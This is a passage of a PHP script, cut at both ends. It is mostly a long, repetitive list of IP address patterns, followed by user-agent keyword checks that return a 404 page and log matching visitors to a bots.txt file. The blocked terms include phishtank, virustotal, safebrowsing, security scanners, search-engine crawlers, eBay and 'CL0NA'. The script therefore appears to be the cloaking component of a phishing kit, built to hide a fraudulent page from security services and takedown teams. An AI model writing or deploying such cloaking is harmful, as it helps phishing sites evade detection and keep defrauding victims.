  "^92.103.69.*",
  "^217.74.103.*",
  "^66.211.160.86*",
  "^46.244.*.*",
  "^131.120.12.*",
  "^157.201.10.*",
  "^172.217.*.*",
  "^103.86.99.*",
  "^213.100.*.*",
  "^216.58.*.*",
  "^173.194.*.*",
  "^74.125.133.*",
  "^66.102.*.*",
  "^66.249.*.*",
  "^209.85.*.*",
  "^216.239.*.*",
  "^64.4.*.*",
  "^65.52.*.*",
  "^131.253.*.*",
  "^157.54.*.*",
  "^207.46.*.*",
  "^207.68.*.*",
  "^8.12.*.*",
  "^66.196.*.*",
  "^66.228.*.*",
  "^67.195.*.*",
  "^68.142.*.*",
  "^72.30.*.*",
  "^74.6.*.*",
  "^98.136.*.*",
  "^202.160.*.*",
  "^209.191.*.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^184.165.*.*",
  "^198.68.61.*",
  "^199.3.10.*",
  "^204.119.24.*",
  "^204.251.90.*",
  "^100.43.*.*",
  "^72.94.249.*",
  "^103.6.76.*",
  "^106.12.*.*",
  "^115.231.36.*",
  "^5.189.*.*",
  "^66.102.6.*",
  "^66.249.*.*",
  "^173.252.*.*",
  "^196.23.168.*",
  "^190.82.81.*",
  "^92.189.25.*",
  "^52.31.147.*",
  "^69.164.111.*",
  "^173.252.86.*",
  "^173.239.*.*",
  "^203.215.181.*",
  "^208.43.225.*",
  "^173.192.*.*",
  "^212.113.37.*",
  "^119.63.*.*",
  "^188.207.200.*",
  "^89.108.102.*",
  "^173.11.97.*",
  "^209.185.108.*",
  "^209.185.253.*",
  "^216.239.*.*",
  "^64.68.*.*",
  "^66.249.*.*",
  "^72.14.199.*",
  "^8.6.48.*",
  "^141.185.209.*",
  "^169.207.238.*",
  "^202.160.*.*",
  "^195.211.*.*",
  "^185.41.162.*",
  "^51.15.*.*",
  "^84.51.153.*",
  "^185.220.101.*",
  "^40.85.158.*",
  "^72.94.249.*",
  "^8.23.224.*",
  "^104.132.20.*",
  "^1.33.126.*",
  "^217.96.*.*",
  "^64.233.160.*",
  "^93.119.*.*",
  "^23.27.152.*",
  "^111.231.*.*",
  "^144.217.82.*",
  "^148.163.128.*",
  "^41.208.72.*",
  "^36.74.236.*",
  "^64.233.173.*",
  "^36.83.56.*",
  "^87.115.213.*",
  "^110.88.*.*",
  "^46.101.119.*",
  "^87.115.213.*",
  "^68.14.83.*",
  "^100.6.107.*",
  "^174.255.*.*",
  "^72.49.133.*",
  "^104.15.60.*",
  "^35.153.86.*",
  "^191.98.136.*",
  "^175.135.172.*",
  "^134.119.*.*",
  "^208.101.*.*",
  "^104.42.*.*",
  "^181.229.*.*",
  "^89.234.*.*",
  "^186.6.*.*",
  "^103.19.16.*",
  "^158.69.216.*",
  "^157.39.109.*",
  "^83.31.*.*",
  "^92.23.56.*",
  "^86.132.235.*",
  "^106.133.165.*",
  "^111.89.*.*",
  "^14.101.178.*",
  "^107.178.*.*",
  "^180.29.89.*",
  "^61.21.221.*",
  "^204.85.191.*",
  "^188.166.*.*",
  "^103.19.16.*",
  "^199.59.150.*",
  "^209.135.212.*",
  "^208.87.233.*",
  "^83.31.*.*",
  "^49.104.10.*",
  "^216.252.*.*",
  "^24.172.*.*",
  "^193.128.*.*",
  "^162.244.*.*",
  "^40.121.198.*",
  "^95.45.252.*",
  "^188.166.*.*",
  "^83.71.*.*",
  "^66.214.*.*",
  "^205.201.132.*",
  "^40.107.*.*",
  "^104.132.*.*",
  "^173.205.33.*",
  "^185.145.156.*",
  "^17.198.249.*",
  "^103.35.*.*",
  "^128.28.*.*",
  "^128.72.*.*",
  "^128.75.*.*",
  "^138.122.*.*",
  "^139.59.*.*",
  "^50.107.*.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^66.211.169.3",
  "^66.211.169.66",
  "^89.163.159.214",
  "^37.128.131.171",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^104.108.64.175",
  "104.83.233.198",
  "^173.194.116.102",
  "^173.194.112.*",
  "^65.55.206.154",
  "^193.221.113.53",
  "^208.76.45.53",
  "^208.84.*.*",
  "^207.46.8.167",
  "^65.54.188.110",
  "^207.46.8.199",
  "^134.170.2.199",
  "^65.55.92.152",
  "^65.54.188.94",
  "^65.55.37.104",
  "^65.55.92.168",
  "^65.55.37.120",
  "^65.55.33.119",
  "^65.55.92.184",
  "^65.54.188.126",
  "^65.55.37.88",
  "^65.55.37.88",
  "^65.55.92.136",
  "^207.46.8.199",
  "^65.55.92.168",
  "^65.54.188.94",
  "^65.55.33.119",
  "^65.55.37.104",
  "^65.54.188.110",
  "^65.55.37.72",
  "^65.55.92.152",
  "^207.46.8.167",
  "^65.55.33.135",
  "^134.170.2.199",
  "^65.55.85.12",
  "^173.194.116.149",
  "^216.58.211.37",
  "^89.163.159.214",
  "^64.233.*.*",
  "^66.102.*.*",
  "^66.249.*.*",
  "^216.239.*.*",
  "^216.33.229.163",
  "^64.233.173.*",
  "^64.68.90.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^54.228.218.117",
  "^54.228.218.*",
  "^185.28.20.243",
  "^185.28.20.*",
  "^217.16.26.166",
  "^217.16.26.*
               ^206.207.*.*",
  "^209.19.*.*",
  "^207.70.*.*",
  "^185.75.*.*",
  "^193.226.*.*",
  "^66.102.*.*",
  "^64.71.*.*",
  "^69.164.*.*",
  "^64.74.*.*",
  "^64.235.*.*",
  "^4.14.64.*.*",
  "^4.14.64.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^72.13.86.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^198.25.*.*",
  "^4.14.0.0",
  "^206.207.*.*",
  "^209.19.*.*",
  "^207.70.*.*",
  "^185.75.*.*",
  "^193.226.*.*",
  "^66.102.*.*",
  "^64.71.*.*",
  "^69.164.*.*",
  "^64.74.*.*",
  "^64.235.*.*",
  "^4.14.64.*.*",
  "^4.14.64.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^72.13.86.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^198.25.*.*",
  "^4.14.0.0",
  '^104.236.153.*',
  '^107.170.*.*',
  '^64.71.206.*',
  '^64.71.205.*',
  '^64.71.204.*',
  '^66.102.8.*',
  '^157.55.39.*',
  '^105.107.79.*',
  '^4.14.64.*',
  '^64.74.215.*',
  '^198.186.190.*',
  '^198.186.191.*',
  '^198.186.192.*',
  '^198.186.193.*',
  '^109.186.*.*',
  '^12.148.196.*',
  '^12.148.209.*',
  '^128.242.*.*',
  '^131.212.*.*',
  '^149.20.*.*',
  '^158.108.*.*',
  '^163.195.178.*',
  '^167.24.*.*',
  '^168.188.*.*',
  '^173.194.*.*',
  '^173.224.160.*',
  '^173.224.161.*',
  '^173.224.162.*',
  '^173.224.163.*',
  '^173.224.164.*',
  '^173.224.165.*',
  '^173.224.166.*',
  '^173.224.167.*',
  '^184.173.*.*',
  '^192.115.134.*',
  '^192.118.48.*',
  '^193.220.178.*',
  '^193.253.199.*',
  '^193.47.80.*',
  '^194.52.68.*',
  '^194.72.238.*',
  '^194.90.*.*',
  '^198.25.*.*',
  '^198.54.*.*',
  '^199.30.228.*',
  '^202.108.252.*',
  '^204.14.48.*',
  '^206.28.72.*',
  '^207.126.144.*',
  '^208.65.144.*',
  '^208.91.115.*',
  '^209.73.228.*',
  '^209.85.*.*',
  '^209.85.128.*',
  '^212.143.*.*',
  '^212.150.*.*',
  '^212.235.*.*',
  '^212.29.192.*',
  '^212.29.224.*',
  '^212.50.193.*',
  '^216.10.193.*',
  '^216.239.32.*',
  '^216.252.167.*',
  '^217.132.*.*',
  '^217.132.*.*',
  '^38.100.*.*',
  '^38.100.*.*',
  '^38.105.*.*',
  '^38.144.36.*',
  '^46.116.*.* ',
  '^50.7.*.*',
  '^50.97.*.*',
  '^54.176.*.*',
  '^62.116.207.*',
  '^62.90.*.*',
  '^64.106.213.*',
  '^64.124.14.*',
  '^64.18.*.*',
  '^64.233.160.*',
  '^64.27.2.*',
  '^64.37.103.*',
  '^64.62.136.*',
  '^64.62.175.*',
  '^66.102.*.*',
  '^66.102.*.*',
  '^66.135.200.*',
  '^66.150.14.*',
  '^66.205.64.*',
  '^66.207.120.*',
  '^66.221.*.*',
  '^66.249.*.*',
  '^67.15.*.*',
  '^67.209.128.*',
  '^68.65.53.71',
  '^69.61.12.*',
  '^69.65.*.*',
  '^72.14.192.*',
  '^72.14.192.*',
  '^74.125.*.*',
  '^74.125.*.*',
  '^74.125.*.*',
  '^81.161.59.*',
  '^82.166.*.*',
  '^85.250.*.*',
  '^85.64.*.*',
  '^89.138.*.*',
  '^89.138.*.*',
  '^91.103.66.*',
  '^93.172.*.*',
  "^81.161.59.*",
  "^66.135.200.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^91.103.66.*",
  "^208.91.115.*",
  "^199.30.228.*",
  "^66.102.*.*",
  "^104.236.153.*",
  "^65.55.85.12",
  "^66.211.169.3",
  "^66.211.169.66",
  "^89.163.159.214",
  "^37.128.131.171",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "^104.108.64.175",
  "104.83.233.198",
  "^173.194.116.102",
  "^173.194.112.*",
  "^65.55.206.154",
  "^193.221.113.53",
  "^208.76.45.53",
  "^208.84.*.*",
  "^207.46.8.167",
  "^65.54.188.110",
  "^207.46.8.199",
  "^134.170.2.199",
  "^65.55.92.152",
  "^65.54.188.94",
  "^65.55.37.104",
  "^65.55.92.168",
  "^65.55.37.120",
  "^65.55.33.119",
  "^65.55.92.184",
  "^65.54.188.126",
  "^65.55.37.88",
  "^65.55.37.88",
  "^65.55.92.136",
  "^207.46.8.199",
  "^65.55.92.168",
  "^65.54.188.94",
  "^65.55.33.119",
  "^65.55.37.104",
  "^65.54.188.110",
  "^1.128.96.181",
  "^65.208.151.*",
  "^1.132.97.75",
  "^1.152.96.223",
  "^38.100.*.*",
  "^185.20.5.*",
  "^185.20.4.*",
  "^95.76.156.*",
  "^216.58.211.37",
  "^173.194.116.149",
  "^107.170.*.*",
  "^64.68.90.*",
  "^64.233.173.*",
  "^216.33.229.163",
  "^216.239.*.*",
  "^89.163.159.214",
  "^149.20.*.*",
  "^219.117.238.170",
  "^79.79.148.223",
  "^62.149.225.67",
  "^104.131.165.123",
  "^46.101.249.238",
  "^79.79.147.162",
  "^178.62.113.173",
  "^1.152.97.32",
  "^101.174.147.73",
  "27.54.62.91",
  "4.14.64.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^38.100.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^74.125.*.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^74.125.*.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^72.14.192.*",
  "^66.102.*.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^46.116.*.* ",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^89.138.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^217.132.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "^68.65.53.71",
  "^64.235.153.*",
  "^64.235.154.*",
  "^198.25.*.*",
  "^64.106.213.*",
  "54.228.218.117",
  "^54.228.218.*",
  "185.28.20.243",
  "^185.28.20.*",
  "217.16.26.166",
  "162.224.156.32",
  "^204.101.161.159",
  "^217.16.26.*",
  "^216.162.209.*",
  "^64.71.193.*",
  "^185.75.141.32",
  "^209.66.70.*",
  "^207.70.60.*",
  "^209.19.185.*",
  "^209.*",
  "^104.236.153.*",
  "^107.170.*.*",
  "^109.186.*.*",
  "^12.148.196.*",
  "^12.148.209.*",
  "^128.242.*.*",
  "^131.212.*.*",
  "^149.20.*.*",
  "^158.108.*.*",
  "^163.195.178.*",
  "^167.24.*.*",
  "^168.188.*.*",
  "^173.194.*.*",
  "^173.224.160.*",
  "^173.224.161.*",
  "^173.224.162.*",
  "^173.224.163.*",
  "^173.224.164.*",
  "^173.224.165.*",
  "^173.224.166.*",
  "^173.224.167.*",
  "^184.173.*.*",
  "^192.115.134.*",
  "^192.118.48.*",
  "^193.220.178.*",
  "^193.253.199.*",
  "^193.47.80.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^194.90.*.*",
  "^198.25.*.*",
  "^198.54.*.*",
  "^199.30.228.*",
  "^202.108.252.*",
  "^204.14.48.*",
  "^206.28.72.*",
  "^207.126.144.*",
  "^208.65.144.*",
  "^208.91.115.*",
  "^209.73.228.*",
  "^209.85.*.*",
  "^209.85.128.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.50.193.*",
  "^216.10.193.*",
  "^216.239.32.*",
  "^216.252.167.*",
  "^217.132.*.*",
  "^217.132.*.*",
  "^38.100.*.*",
  "^38.100.*.*",
  "^38.105.*.*",
  "^38.144.36.*",
  "^46.116.*.* ",
  "^50.7.*.*",
  "^50.97.*.*",
  "^54.176.*.*",
  "^62.116.207.*",
  "^62.90.*.*",
  "^64.106.213.*",
  "^64.124.14.*",
  "^64.18.*.*",
  "^64.233.160.*",
  "^64.27.2.*",
  "^64.37.103.*",
  "^64.62.136.*",
  "^64.62.175.*",
  "^66.102.*.*",
  "^66.102.*.*",
  "^66.135.200.*",
  "^66.150.14.*",
  "^66.205.64.*",
  "^66.207.120.*",
  "^66.221.*.*",
  "^66.249.*.*",
  "^67.15.*.*",
  "^67.209.128.*",
  "^68.65.53.71",
  "^69.61.12.*",
  "^69.65.*.*",
  "^72.14.192.*",
  "^72.14.192.*",
  "^74.125.*.*",
  "^74.125.*.*",
  "^74.125.*.*",
  "^81.161.59.*",
  "^82.166.*.*",
  "^85.250.*.*",
  "^85.64.*.*",
  "^89.138.*.*",
  "^89.138.*.*",
  "^91.103.66.*",
  "^93.172.*.*",
  "^95.76.156.*",
  "^64.71.*.*",
  "^203.188.221.*",
  "^209.19.186.231",
  "^206.207.80.*",
  "^209.19.*.*",
  "^206.80.*.*",
  "^207.80.*.*",
  "^207.70.60.*",
  "^108.210.106.*",
  "^173.14.18.*",
  "^52.90.*.*",
  "^35.172.115.*",
  "^54.164.*.*",
  "^222.154.252.*",
  "^195.211.23.*",
  "^13.57.36.*",
  "^210.55.200.*",
  "^42.112.8.*"
);

foreach ($ips as $ip) {
  if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {

    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Blacklist ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$dp = strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
  "bot",
  "above",
  "google",
  "docomo",
  "mediapartners",
  "phantomjs",
  "lighthouse",
  "reverseshorturl",
  "samsung-sgh-e250",
  "softlayer",
  "amazonaws",
  "cyveillance",
  "crawler",
  "gsa-crawler",
  "phishtank",
  "dreamhost",
  "netpilot",
  "calyxinstitute",
  "tor-exit",
  "apache-httpclient",
  "lssrocketcrawler",
  "crawler",
  "urlredirectresolver",
  "jetbrains",
  "spam",
  "windows 95",
  "windows 98",
  "acunetix",
  "netsparker",
  "007ac9",
  "008",
  "Feedfetcher",
  "192.comagent",
  "200pleasebot",
  "360spider",
  "4seohuntbot",
  "50.nu",
  "a6-indexer",
  "admantx",
  "amznkassocbot",
  "aboundexbot",
  "aboutusbot",
  "abrave spider",
  "accelobot",
  "acoonbot",
  "addthis.com",
  "adsbot-google",
  "ahrefsbot",
  "alexabot",
  "amagit.com",
  "analytics",
  "antbot",
  "apercite",
  "aportworm",
  "EBAY",
  "CL0NA",
  "jabber",
  "ebay",
  "arabot",
  "hotmail!",
  "msn!",
  "baidu",
  "outlook!",
  "outlook",
  "msn",
  "duckduckbot",
  "hotmail",
  "go-http-client",
  "go-http-client/1.1",
  "trident",
  "presto",
  "virustotal",
  "unchaos",
  "dreampassport",
  "sygol",
  "nutch",
  "privoxy",
  "zipcommander",
  "neofonie",
  "abacho",
  "acoi",
  "acoon",
  "adaxas",
  "agada",
  "aladin",
  "alkaline",
  "amibot",
  "anonymizer",
  "aplix",
  "aspseek",
  "avant",
  "baboom",
  "anzwers",
  "anzwerscrawl",
  "crawlconvera",
  "del.icio.us",
  "camehttps",
  "annotate",
  "wapproxy",
  "translate",
  "feedfetcher",
  "ask24",
  "asked",
  "askaboutoil",
  "fangcrawl",
  "amzn_assoc",
  "bingpreview",
  "dr.web",
  "drweb",
  "bilbo",
  "blackwidow",
  "sogou",
  "sogou-test-spider",
  "exabot",
  "externalhit",
  "ia_archiver",
  "googletranslate",
  "translate",
  "proxy",
  "dalvik",
  "quicklook",
  "seamonkey",
  "sylera",
  "safebrowsing",
  "safesurfingwidget",
  "preview",
  "whatsapp",
  "telegram",
  "instagram",
  "zteopen",
  "icoreservice",
  "untrusted"

);
foreach ($blocked_words as $word2) {
  if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "    ") {

    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bad words ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$Bot = array(
  "abot",
  "dbot",
  "ebot",
  "hbot",
  "kbot",
  "lbot",
  "mbot",
  "nbot",
  "obot",
  "pbot",
  "rbot",
  "sbot",
  "tbot",
  "vbot",
  "ybot",
  "zbot",
  "bot.",
  "bot/",
  "_bot",
  ".bot",
  "/bot",
  "-bot",
  ":bot",
  "(bot",
  "crawl",
  "slurp",
  "spider",
  "seek",
